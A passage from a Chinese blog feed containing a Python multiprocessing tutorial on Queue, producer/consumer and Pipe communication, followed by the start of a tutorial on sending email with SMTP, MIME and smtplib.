False)</code></td></tr><tr><td><code>get(item[,block[,timeout]])</code></td><td>在队列中删除元素并返回该元素的值</td></tr><tr><td><code>get_nowait()</code></td><td>等价与<code>get(Flase)</code></td></tr><tr><td>close()</td><td>表示该<code>queue</code> 不加入新元素</td></tr><tr><td><code>join_theread()</code></td><td>加入后台线程,只能在调用<code>close()</code> 后使用.它阻塞直到后台线程退出,确保缓冲区所有数据已经刷新到管道.默认情况下,如果进程不是队列的创建者,则退出.它将尝试加入队列的后台线程.</td></tr><tr><td><code>cancle_join_thread()</code></td><td>终止<code>join_thread()</code>防止后台线程在进程退出时被自动连接,可能会导致数据丢失</td></tr></tbody></table></blockquote><h4 id="队列实例"><a href="#队列实例" class="headerlink" title="队列实例"></a>队列实例</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token punctuation">,</span>os<span class="token punctuation">,</span>random<span class="token triple-quoted-string string">"""queue队列在队列中,进程是相互独立的.数据的交互,可以使用队列一个写入,一个读取"""</span><span class="token keyword">def</span> <span class="token function">write_process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'put {} to queue ...'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> <span class="token operator">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      value <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'get {} from queue...'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""主进程"""</span><span class="token comment" spellcheck="true"># 使用主进程创建队列</span>main_process_queue <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建子进程</span>write_process_child <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>write_process<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>main_process_queue<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>read_process_child <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>read_process<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>main_process_queue<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 启动并阻塞</span>write_process_child<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>write_process_child<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>read_process_child<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>read_process_child<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">put A to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>put B to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>put C to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>put D to queue<span class="token punctuation">..</span><span class="token punctuation">..</span>Get A from queueGet B from queueGet C from queueGet D from queue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="生产者-消费者模式"><a href="#生产者-消费者模式" class="headerlink" title="生产者/消费者模式"></a>生产者/消费者模式</h4><blockquote><p>以上就类似于生产者/消费者模式</p><p>它包含两类进程:一种只是用来生产数据,例外一种只是用来消费数据.为了串联他们,通常会采用共享的数据区域,就像一个仓库.生产者产生的数据都放入仓库中并不需要关注消费者的行为,消费者只需要从共享仓库中获取数据,并不需要关心生产者的行为.</p><p>而作为仓库关注的行为是:</p><ul><li>如果仓库共享数据区域已满的状态</li><li>如果共享数据区域已空的状态</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>os<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token comment" spellcheck="true"># 定义生产者</span><span class="token keyword">class</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue        super<span class="token punctuation">(</span>Producer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            item <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 添加到队列</span>            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>item<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'生产者进程:{},添加{}到Queue队列中...'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'队列大小:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义消费者</span><span class="token keyword">class</span> <span class="token class-name">Cunsumer</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue        super<span class="token punctuation">(</span>Cunsumer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'队列非空'</span><span class="token punctuation">)</span>                item <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'消费者进程:{},从队列中取出:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'队列为空,退出'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主进程"""</span>    queue <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    producer <span class="token operator">=</span> Producer<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>    cunsumer <span class="token operator">=</span> Cunsumer<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>    producer<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    producer<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    cunsumer<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    cunsumer<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-bash"><code class="language-bash">生产者进程:Producer-1,添加227到Queue队列中<span class="token punctuation">..</span>.队列大小:1生产者进程:Producer-1,添加114到Queue队列中<span class="token punctuation">..</span>.队列大小:2生产者进程:Producer-1,添加252到Queue队列中<span class="token punctuation">..</span>.队列大小:3队列非空消费者进程:Cunsumer-2,从队列中取出:227队列非空消费者进程:Cunsumer-2,从队列中取出:114队列非空消费者进程:Cunsumer-2,从队列中取出:252队列为空,退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Queue</code> 在其中扮演了一个仓库的角色,就是用来处理共享数据的</p></blockquote><h3 id="2-使用pipe-管道"><a href="#2-使用pipe-管道" class="headerlink" title="2.使用pipe 管道"></a>2.使用<code>pipe</code> 管道</h3><blockquote><p><code>Pipe</code> 不是类,是函数,该函数定义在<code>multiprocessing\connection.py</code> 中,返回一对通过管道连接的对象<code>con1</code>和<code>con2</code>,函数的原型是<code>Pipe()duplex=True</code></p><ul><li><code>dublex=True</code>(默认值):管道是双向的,处于全双工模式,<code>con1\con2</code> 都可以收发数据</li><li><code>dublex=False</code> ,管道是单向的,<code>con1</code> 只能用于发送,<code>con2</code> 只能用于接受</li></ul><pre class="line-numbers language-python">con1, con2 = multiprocessing.Pipe([duplex])</code></pre><p><code>Pipe()</code> 返回的是管道的两端,两端每个对象都有<code>send()</code>和<code>recv()</code> 方法(还有其他方法),例如在全双工模式下,可以用<code>con1.send()</code> 发送消息,<code>con2.recv()</code>接受消息,如果没有消息可以接受,<code>recv()</code>方法会一直阻塞,如果管道已经关闭,<code>recv()</code> 会抛出<code>EOFError</code> 异常</p><p>常用方法:</p><table><thead><tr><th><code>send(obj)</code></th><th>将一个对象发送到连接的另外一端</th></tr></thead><tbody><tr><td><code>recv()</code></td><td>返回一个由另一端<code>send()</code>的对象,该方法会一直阻塞直到接收到对象,如果对端关闭了连接,或者没有东西可以接受,将抛出<code>EOFError</code></td></tr><tr><td><code>fileno</code></td><td>返回由连接对象使用的描述符</td></tr><tr><td><code>close()</code></td><td>关闭连接对象</td></tr><tr><td><code>poll()</code></td><td>返回连接对象是否有可以读取的数据.</td></tr></tbody></table></blockquote><h4 id="1-主进程和子进程管道通信"><a href="#1-主进程和子进程管道通信" class="headerlink" title="1.主进程和子进程管道通信"></a>1.主进程和子进程管道通信</h4><blockquote><p>需要注意的是,管道在建立的时候自动连接了主进程,不管是使用全双工,还是半双工,都需要对主进程的管道进行处理.</p><p>在全双工模式中,假设主进程是发送端,子进程是接收端</p><pre><code class="python"><code class="language-python">con1, con2 = multiprocessing.Pipe([duplex])</code></pre><p><code>Pipe()</code> 返回的是管道的两端,两端每个对象都有<code>send()</code>和<code>recv()</code> 方法(还有其他方法),例如在全双工模式下,可以用<code>con1.send()</code> 发送消息,<code>con2.recv()</code>接受消息,如果没有消息可以接受,<code>recv()</code>方法会一直阻塞,如果管道已经关闭,<code>recv()</code> 会抛出<code>EOFError</code> 异常</p><p>常用方法:</p><table><thead><tr><th><code>send(obj)</code></th><th>将一个对象发送到连接的另外一端</th></tr></thead><tbody><tr><td><code>recv()</code></td><td>返回一个由另一端<code>send()</code>的对象,该方法会一直阻塞直到接收到对象,如果对端关闭了连接,或者没有东西可以接受,将抛出<code>EOFError</code></td></tr><tr><td><code>fileno</code></td><td>返回由连接对象使用的描述符</td></tr><tr><td><code>close()</code></td><td>关闭连接对象</td></tr><tr><td><code>poll()</code></td><td>返回连接对象是否有可以读取的数据.</td></tr></tbody></table></blockquote><h4 id="1-主进程和子进程管道通信"><a href="#1-主进程和子进程管道通信" class="headerlink" title="1.主进程和子进程管道通信"></a>1.主进程和子进程管道通信</h4><blockquote><p>需要注意的是,管道在建立的时候自动连接了主进程,不管是使用全双工,还是半双工,都需要对主进程的管道进行处理.</p><p>在全双工模式中,假设主进程是发送端,子进程是接收端</p><pre><code class="python">"""全双工管道"""import multiprocessing,timedef child_process(pipe):while True:  try:      time.sleep(1)      num = pipe.recv()      print('子进程:{},接收:{}'.format(multiprocessing.current_process().name, num))      print('pipe管道状态', pipe.poll())  except Exception:      print('如果一端被关闭,另外一端接收完毕后,会报错')      breakif __name__ == '__main__':"""主进程"""recv_pipe, send_pipe = multiprocessing.Pipe(duplex=True)# 主进程即是发送端,也是接收端for i in range(5):  send_pipe.send(i)  print("主进程Pipe发送:{}".format(i))# 发送完毕后,关闭通道send_pipe.close()child_process_pipe = multiprocessing.Process(target=child_process, args=(recv_pipe, ))child_process_pipe.start()child_process_pipe.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">主进程Pipe发送:0主进程Pipe发送:1主进程Pipe发送:2主进程Pipe发送:3主进程Pipe发送:4子进程:Process-1,接收:0pipe管道状态 True子进程:Process-1,接收:1pipe管道状态 True子进程:Process-1,接收:2pipe管道状态 True子进程:Process-1,接收:3pipe管道状态 True子进程:Process-1,接收:4pipe管道状态 True如果一端被关闭,另外一端接收完毕后,会报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反之,主进程也能当接收端,子进程当发送端.</p><p>关闭管道后,<code>try</code> 语句用于处理产生的<code>EOFError</code> 异常</p></blockquote><h4 id="2-主进程闲置-2个子进程一发一收"><a href="#2-主进程闲置-2个子进程一发一收" class="headerlink" title="2.主进程闲置,2个子进程一发一收"></a>2.主进程闲置,2个子进程一发一收</h4><blockquote><p>在全双工模式下,就算主进程闲置,主进程也连接在管道的一端,既可以在接收端,也可以在发送端.需要自己去选择把握.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">proc1</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'send: %s'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>  pipe<span class="token punctuation">.</span>send<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pipe.send 发送数据</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pipe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">proc2</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'proc2 recv:'</span><span class="token punctuation">,</span> pipe<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pipe.recv 用与接收数据</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pipe1<span class="token punctuation">,</span> pipe2 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>proc1<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>proc2<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 在主进程端把发送pipe关闭</span>pipe1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>p2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关闭管道后,<code>try</code> 语句用于处理产生的<code>EOFError</code> 异常</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FlaskMail</title>
      <link href="/posts/56618.html"/>
      <url>/posts/56618.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-21/1603288807365-10322.png" alt="10322"></p><h1 id="Mail电子邮件"><a href="#Mail电子邮件" class="headerlink" title="Mail电子邮件"></a>Mail电子邮件</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><h3 id="1-电子邮件定义"><a href="#1-电子邮件定义" class="headerlink" title="1.电子邮件定义"></a>1.电子邮件定义</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6" target="_blank" rel="noopener">电子邮件</a>,又称电子邮箱，简称电邮，是指一种由一寄件人将数字信息发送给一个人或多个人的信息交换方式，一般会通过互联网或其他电脑网络进行书写、发送和接收信件，目的是达成发信人和收信人之间的信息交互。</p></blockquote><h3 id="2-电子邮件的传输过程"><a href="#2-电子邮件的传输过程" class="headerlink" title="2.电子邮件的传输过程"></a>2.电子邮件的传输过程</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-20/1603196846311-mailtranslate.jpg"></p><p>假设Alice(<code>alice@a.org</code>)利用电子邮件客户端写了一封电邮，输入收信人Bob(<code>Bob@b.org</code>)的电邮地址，按下“寄信”钮后，后续的流程如下：</p><ul><li><p>1.Alice通过foxmail把邮件写好，填写了对方Bob的email地址，点击“发送”，电子邮件发出。(这样的电子邮件被成为MUA–Mail User Agent–邮件用户代理)</p></li><li><p>2.Email从MUA发出去，不是直接到达对方的电脑，而是发给被的MTA(Mail Transfer Agent–邮件传输代理)，也就是那些Email服务供应商，比如163，sina等，这里把邮件发送给a提供的MTA，再由a的MTA发送给b的MTA。在这个过程中还要经过别的MTA。</p></li><li><p>3.Email到达b的MTA后，由于双方都是使用的@b.org，因此b的MTA投递到邮件的最终目的地MDA(Mail Delivery Agent–邮件投递代理)，email到达MDA后，就停留在服务器上，存放在某个文件或数据库中，我们将这个长期保存邮件的地方称为电子邮箱。</p></li><li><p>4.Bob通过自己的foxmail，通过MUA从MDA上把邮件提取到自己的电脑上。</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-20/1603196958073-400px-Email.svg.png"></p></li></ul></blockquote><h3 id="3-使用python发送邮件"><a href="#3-使用python发送邮件" class="headerlink" title="3.使用python发送邮件"></a>3.使用python发送邮件</h3><blockquote><p>所以要编写程序来发送和接受邮件，本质就是:</p><ul><li><p>1.编写MUA把邮件发送给MTA</p></li><li><p>2.编写MUA把邮件从MDA上收取</p><p>发邮件时，MUA和MTA使用的协议就是SMTP：<code>Simple Mail Transfer Protocol</code>，后面的MTA到另一个MTA也是用SMTP协议。</p><p>收邮件时，MUA和MDA使用的协议有两种：</p></li><li><p>POP：Post Office Protocol，目前版本是3，俗称POP3；</p></li><li><p>IMAP：<code>Internet Message Access Protocol</code>，目前版本是4，优点是不但能取邮件，还可以直接操作MDA上存储的邮件，比如从收件箱移到垃圾箱，等等。</p><p>邮件客户端软件在发邮件时，会让你先配置SMTP服务器，也就是你要发到哪个MTA上。假设你正在使用163的邮箱，你就不能直接发到新浪的MTA上，因为它只服务新浪的用户，所以，你得填163提供的SMTP服务器地址：smtp.163.com，为了证明你是163的用户，SMTP服务器还要求你填写邮箱地址和邮箱口令，这样，MUA才能正常地把Email通过SMTP协议发送到MTA。</p><p>类似的，从MDA收邮件时，MDA服务器也要求验证你的邮箱口令，确保不会有人冒充你收取你的邮件，所以，Outlook之类的邮件客户端会要求你填写POP3或IMAP服务器地址、邮箱地址和口令，这样，MUA才能顺利地通过POP或IMAP协议从MDA取到邮件。</p></li></ul></blockquote><h2 id="2-SMTP发送邮件"><a href="#2-SMTP发送邮件" class="headerlink" title="2.SMTP发送邮件"></a>2.<code>SMTP</code>发送邮件</h2><blockquote><p>SMTP(<code>Simple Mail Transfer Protocol</code>,简单邮件传输协议)是发送邮件的协议，Python内置对SMTP的支持，可以发送纯文本邮件、HTML邮件以及带附件的邮件。python发送邮件主要使用到了smtplib和email两个模块，email负责构造邮件，smtplib负责发送邮件。</p></blockquote><h3 id="1-邮件格式-RFC-2822"><a href="#1-邮件格式-RFC-2822" class="headerlink" title="1.邮件格式(RFC 2822)"></a>1.邮件格式(<code>RFC 2822</code>)</h3><blockquote><p>每封邮件都有两个部分：邮件头和邮件体，两者使用一个空行分隔。<br>邮件头每个字段 (Field) 包括两部分：字段名和字段值，两者使用冒号分隔。有两个字段需要注意：From和Sender字段。From字段指明的是邮件的作者，Sender字段指明的是邮件的发送者。如果From字段包含多于一个的作者，必须指定Sender字段；如果From字段只有一个作者并且作者和发送者相同，那么不应该再使用Sender字段，否则From字段和Sender字段应该同时使用。<br>邮件体包含邮件的内容，它的类型由邮件头的Content-Type字段指明。RFC 2822定义的邮件格式中，邮件体只是单纯的ASCII编码的字符序列。</p><p>(Multipurpose Internet Mail Extensions) (RFC 1341)[现在使用]</p><p>MIME扩展邮件的格式，用以支持非ASCII编码的文本、非文本附件以及包含多个部分 (multi-part) 的邮件体等。<br>MIME消息是由消息头和消息体2大部分组成，在邮件中对应了邮件头和邮件体。邮件头和邮件体之间以空行分割。</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-20/1603196846307-MIMEconstitute.png"></p><p>邮件头包含了发件人、收件人、主题、时间、MIME版本、邮件内容的类型等重要信息。每条信息称为一个域，由域名后加“: ”和信息内容构成，可以是一行，较长的也可以占用多行。域的首行必须“顶头”写，即左边不能有空白字符（空格和制表符）；续行则必须以空白字符打头，且第一个空白字符不是信息本身固有的。</p><p>邮件体包含邮件的内容，它的类型由邮件头的“Content-Type”域指出。最常见的类型有text/plain(纯文本)和text/html(超文本)。邮件体被分为多个段，每个段又包含段头和段体两部分，这两部分之间也以空行分隔。常见的multipart类型有三种：multipart/mixed, multipart/related和multipart/alternative</p></blockquote><h3 id="2-MIME函数的层次结构"><a href="#2-MIME函数的层次结构" class="headerlink" title="2.MIME函数的层次结构"></a>2.MIME函数的层次结构</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-20/1603196846302-MIME%E5%87%BD%E6%95%B0%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png"></p></blockquote><h3 id="3-相关模块"><a href="#3-相关模块" class="headerlink" title="3.相关模块"></a>3.相关模块</h3><h4 id="1-smtplib"><a href="#1-smtplib" class="headerlink" title="1.smtplib"></a>1.<code>smtplib</code></h4><blockquote><p>SMTP类构造函数，表示与smtp服务器之间的连接，通过这个连接可以向smtp服务器发送指令,执行相关操作，(登陆，发送邮件等等)</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> smtplibsmtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">[</span>host<span class="token punctuation">[</span><span class="token punctuation">,</span>port<span class="token punctuation">[</span>local_hostname<span class="token punctuation">[</span><span class="token punctuation">,</span>timeout<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#host：smtp服务器主机名</span><span class="token comment" spellcheck="true">#port：smtp服务器的端口，默认是25，ssl端口465</span><span aria-hidden="true" 